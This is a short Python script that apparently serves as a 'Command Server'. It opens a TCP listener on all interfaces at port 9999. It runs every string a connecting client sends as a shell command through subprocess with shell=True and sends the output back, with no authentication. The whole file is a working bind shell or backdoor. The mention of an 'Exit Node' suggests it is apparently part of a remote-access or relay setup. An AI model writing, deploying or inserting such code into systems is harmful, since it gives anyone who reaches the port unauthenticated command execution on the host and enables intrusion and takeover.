import socket
import subprocess

def start_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"Command Server listening on {host}:{port}")
    
    while True:
        conn, addr = server_socket.accept()
        print(f"Accepted connection from Exit Node: {addr}")
        try:
            while True:
                cmd_data = conn.recv(1024)
                if not cmd_data: break
                
                command_str = cmd_data.decode('utf-8').strip()
                print(f"Executing: {command_str}")
                try:
                    output = subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT)
                    if not output: output = b"Command executed successfully (no output).\n"
                except subprocess.CalledProcessError as e:
                    output = e.output
                    
                conn.sendall(output)
        except Exception as e:
            print(f"Connection error: {e}")
        finally:
            conn.close()

if __name__ == '__main__':
    start_server()